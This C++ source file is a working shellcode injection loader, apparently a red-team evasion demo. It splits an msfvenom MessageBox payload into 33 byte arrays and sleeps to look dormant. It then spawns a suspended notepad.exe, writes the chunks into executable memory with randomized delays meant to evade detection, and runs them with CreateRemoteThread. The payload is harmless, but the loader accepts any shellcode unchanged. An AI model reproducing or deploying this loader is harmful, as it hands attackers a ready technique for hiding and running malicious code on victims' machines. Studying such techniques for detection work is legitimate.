#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <time.h>
#include <chrono>
#include <thread>

// MessageBox shellcode generated with:
// msfvenom -p windows/x64/messagebox TEXT="g3tsyst3m" TITLE="g3tsyst3m" ICON=INFORMATION -f python
unsigned char shellcode1[] = { 0xfc,0x48,0x81 };
unsigned char shellcode2[] = { 0xe4,0xf0,0xff,0xff,0xff,0xe8,0xcc,0x00,0x00,0x00,0x41 };
unsigned char shellcode3[] = { 0x51,0x41,0x50,0x52,0x48,0x31,0xd2,0x51,0x65,0x48,0x8b,0x52,0x60,0x48 };
unsigned char shellcode4[] = { 0x8b,0x52,0x18,0x56,0x48,0x8b,0x52,0x20,0x48,0x0f,0xb7,0x4a,0x4a };
unsigned char shellcode5[] = { 0x48,0x8b,0x72,0x50,0x4d,0x31,0xc9,0x48,0x31,0xc0,0xac };
unsigned char shellcode6[] = { 0x3c,0x61,0x7c };
unsigned char shellcode7[] = { 0x02,0x2c,0x20,0x41,0xc1,0xc9,0x0d,0x41,0x01,0xc1,0xe2,0xed,0x52 };
unsigned char shellcode8[] = { 0x48,0x8b,0x52,0x20,0x41,0x51,0x8b,0x42,0x3c,0x48,0x01,0xd0 };
unsigned char shellcode9[] = { 0x66,0x81,0x78 };
unsigned char shellcode10[] = { 0x18,0x0b,0x02,0x0f,0x85,0x72,0x00,0x00,0x00,0x8b,0x80 };
unsigned char shellcode11[] = { 0x88,0x00,0x00,0x00,0x48,0x85,0xc0,0x74,0x67,0x48,0x01,0xd0,0x8b };
unsigned char shellcode12[] = { 0x48,0x18,0x50,0x44,0x8b,0x40,0x20,0x49,0x01,0xd0,0xe3,0x56 };
unsigned char shellcode13[] = { 0x4d,0x31,0xc9,0x48,0xff,0xc9 };
unsigned char shellcode14[] = { 0x41,0x8b,0x34,0x88 };
unsigned char shellcode15[] = { 0x48,0x01,0xd6 };
unsigned char shellcode16[] = { 0x48,0x31,0xc0,0x41,0xc1,0xc9,0x0d,0xac,0x41,0x01,0xc1,0x38,0xe0,0x75 };
unsigned char shellcode17[] = { 0xf1,0x4c,0x03,0x4c,0x24,0x08 };
unsigned char shellcode18[] = { 0x45,0x39,0xd1,0x75,0xd8 };
unsigned char shellcode19[] = { 0x58,0x44,0x8b,0x40,0x24,0x49,0x01,0xd0,0x66,0x41,0x8b,0x0c,0x48,0x44,0x8b };
unsigned char shellcode20[] = { 0x40,0x1c,0x49,0x01 };
unsigned char shellcode21[] = { 0xd0,0x41,0x8b,0x04,0x88,0x41,0x58,0x41,0x58,0x48 };
unsigned char shellcode22[] = { 0x01,0xd0,0x5e,0x59,0x5a,0x41,0x58,0x41,0x59,0x41,0x5a,0x48,0x83 };
unsigned char shellcode23[] = { 0xec,0x20,0x41,0x52,0xff,0xe0,0x58,0x41,0x59 };
unsigned char shellcode24[] = { 0x5a,0x48,0x8b,0x12,0xe9,0x4b,0xff,0xff };
unsigned char shellcode25[] = { 0xff,0x5d,0xe8,0x0b,0x00,0x00,0x00,0x75,0x73,0x65,0x72 };
unsigned char shellcode26[] = { 0x33,0x32,0x2e,0x64,0x6c };
unsigned char shellcode27[] = { 0x6c,0x00,0x59 };
unsigned char shellcode28[] = { 0x41,0xba,0x4c,0x77,0x26,0x07,0xff,0xd5,0x49,0xc7,0xc1 };
unsigned char shellcode29[] = { 0x40,0x00,0x00,0x00,0xe8,0x0a,0x00,0x00,0x00 };
unsigned char shellcode30[] = { 0x67,0x33,0x74,0x73,0x79,0x73 };
unsigned char shellcode31[] = { 0x74,0x33,0x6d,0x00,0x5a,0xe8,0x0a,0x00,0x00,0x00,0x67,0x33,0x74,0x73,0x79 };
unsigned char shellcode32[] = { 0x73,0x74,0x33,0x6d,0x00,0x41,0x58,0x48,0x31,0xc9,0x41,0xba,0x45,0x83 };
unsigned char shellcode33[] = { 0x56,0x07,0xff,0xd5,0x48,0x31,0xc9,0x41,0xba,0xf0,0xb5,0xa2,0x56,0xff,0xd5 };

// Array of shellcode pointers
unsigned char* shellcodeChunks[] = { shellcode1, shellcode2, shellcode3, shellcode4, shellcode5, shellcode6, shellcode7, shellcode8, shellcode9, shellcode10, shellcode11, shellcode12, shellcode13, shellcode14, shellcode15, shellcode16, shellcode17, shellcode18, shellcode19, shellcode20, shellcode21, shellcode22, shellcode23, shellcode24, shellcode25, shellcode26, shellcode27, shellcode28, shellcode29, shellcode30, shellcode31, shellcode32, shellcode33 };

// Array of shellcode sizes
SIZE_T shellcodeSizes[] = { sizeof(shellcode1), sizeof(shellcode2), sizeof(shellcode3), sizeof(shellcode4), sizeof(shellcode5), sizeof(shellcode6), sizeof(shellcode7), sizeof(shellcode8), sizeof(shellcode9), sizeof(shellcode10), sizeof(shellcode11), sizeof(shellcode12), sizeof(shellcode13), sizeof(shellcode14), sizeof(shellcode15), sizeof(shellcode16), sizeof(shellcode17), sizeof(shellcode18), sizeof(shellcode19), sizeof(shellcode20), sizeof(shellcode21), sizeof(shellcode22), sizeof(shellcode23), sizeof(shellcode24), sizeof(shellcode25), sizeof(shellcode26), sizeof(shellcode27), sizeof(shellcode28), sizeof(shellcode29), sizeof(shellcode30), sizeof(shellcode31), sizeof(shellcode32), sizeof(shellcode33) };

int main() {
    // Seed random
    srand((unsigned int)time(NULL));

    // Initial delay to mimic dormant behavior
    printf("It's slumber time for 10 seconds...\n");
    std::this_thread::sleep_for(std::chrono::milliseconds(10000));

    // Auto-calculate number of chunks
    constexpr size_t numChunks = sizeof(shellcodeChunks) / sizeof(shellcodeChunks[0]);

    // Calculate total size
    SIZE_T totalSize = 0;
    for (size_t i = 0; i < numChunks; i++) {
        totalSize += shellcodeSizes[i];
    }
    printf("[+] Total shellcode size: %zu bytes\n", totalSize);

    // Create suspended notepad.exe
    STARTUPINFO si = { sizeof(si) };
    PROCESS_INFORMATION pi = { 0 };
    if (!CreateProcess(L"C:\\Windows\\System32\\notepad.exe", NULL, NULL, NULL, FALSE,
        CREATE_SUSPENDED, NULL, NULL, &si, &pi)) {
        printf("[-] CreateProcess failed: %lu\n", GetLastError());
        return 1;
    }
    printf("[+] Notepad spawned (PID: %lu)\n", pi.dwProcessId);

    // Allocate final executable memory region
    LPVOID remoteBase = VirtualAllocEx(pi.hProcess, NULL, totalSize,
        MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (!remoteBase) {
        printf("[-] VirtualAllocEx failed: %lu\n", GetLastError());
        TerminateProcess(pi.hProcess, 1);
        CloseHandle(pi.hProcess); CloseHandle(pi.hThread);
        return 1;
    }
    printf("[+] Allocated RWX memory at: %p\n", remoteBase);

    // Staged write: write each chunk directly into final region with random delays
    SIZE_T offset = 0;
    for (size_t i = 0; i < numChunks; i++) {
        int delayMs = 50 + (rand() % 801);  // 50-850ms
        printf("[*] Waiting %d ms before writing chunk %zu...\n", delayMs, i + 1);
        std::this_thread::sleep_for(std::chrono::milliseconds(delayMs));

        if (!WriteProcessMemory(pi.hProcess, (BYTE*)remoteBase + offset,
            shellcodeChunks[i], shellcodeSizes[i], NULL)) {
            printf("[-] WriteProcessMemory failed at chunk %zu: %lu\n", i + 1, GetLastError());
            VirtualFreeEx(pi.hProcess, remoteBase, 0, MEM_RELEASE);
            TerminateProcess(pi.hProcess, 1);
            CloseHandle(pi.hProcess); CloseHandle(pi.hThread);
            return 1;
        }
        printf("[+] Wrote chunk % zu(% zu bytes) -> % p\n", i + 1, shellcodeSizes[i], (BYTE*)remoteBase + offset);
        offset += shellcodeSizes[i];
    }

    printf("[+] Shellcode fully reassembled at %p\n", remoteBase);

    // Execute
    HANDLE hThread = CreateRemoteThread(pi.hProcess, NULL, 0,
        (LPTHREAD_START_ROUTINE)remoteBase, NULL, 0, NULL);
    if (!hThread) {
        printf("[-] CreateRemoteThread failed: %lu\n", GetLastError());
        VirtualFreeEx(pi.hProcess, remoteBase, 0, MEM_RELEASE);
        TerminateProcess(pi.hProcess, 1);
        CloseHandle(pi.hProcess); CloseHandle(pi.hThread);
        return 1;
    }

    WaitForSingleObject(hThread, INFINITE);
    CloseHandle(hThread);

    // Resume notepad (optional — MessageBox will appear)
    ResumeThread(pi.hThread);

    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);

    printf("[+] Execution complete. MessageBox should appear.\n");
    return 0;
}